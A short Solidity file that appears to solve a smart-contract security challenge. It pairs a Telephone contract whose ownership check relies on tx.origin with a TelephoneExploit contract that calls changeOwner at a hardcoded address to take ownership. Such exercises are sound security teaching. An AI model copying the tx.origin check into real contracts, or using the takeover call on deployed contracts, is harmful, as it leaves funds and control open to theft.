// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneExploit {

    address telephoneAddress;

    constructor() public {
        telephoneAddress = 0x0E1CD33F45A20e7c014a171563c793691FF8b70d;
    }

    function fire() public {
        ITelephone(telephoneAddress).changeOwner(tx.origin);
    }
}